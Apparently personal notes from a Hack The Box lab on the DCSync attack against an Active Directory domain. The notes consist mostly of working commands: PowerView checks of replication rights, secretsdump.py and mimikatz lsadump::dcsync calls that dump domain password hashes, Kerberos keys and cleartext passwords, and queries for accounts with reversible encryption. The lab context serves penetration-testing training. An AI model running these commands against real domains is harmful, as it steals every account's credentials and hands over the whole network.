## What is DCSync and How Does it Work?
#### Viewing adunn's Replication Privileges through ADSI Edit
![](Pasted%20image%2020260529151227.png)
#### Using Get-DomainUser to View adunn's Group Membership

```powershell
PS C:\htb> Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
#### Using Get-ObjectAcl to Check adunn's Replication Rights

```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" 
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

```shell
3kjS@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
#### Listing Hashes, Kerberos Keys, and Cleartext Passwords

```shell
3kjS@htb[/htb]$ ls inlanefreight_hashes* 

inlanefreight_hashes.ntds inlanefreight_hashes.ntds.cleartext 
inlanefreight_hashes.ntds.kerberos
```
#### Viewing an Account with Reversible Encryption Password Storage Set
![](Pasted%20image%2020260529151732.png)
#### Enumerating Further using Get-ADUser

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
![](Screenshot%202026-05-29%20at%2015.25.49.png)
#### Checking for Reversible Encryption Option using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
#### Displaying the Decrypted Password

```shell
3kjS@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext
```
#### Using runas.exe

```cmd
Microsoft Windows [Version 10.0.17763.107] 
(c) 2018 Microsoft Corporation. All rights reserved. 

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell 
Enter the password for INLANEFREIGHT\adunn: 
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```
#### Performing the Attack with Mimikatz

```cmd
PS C:\htb> .\mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL
```
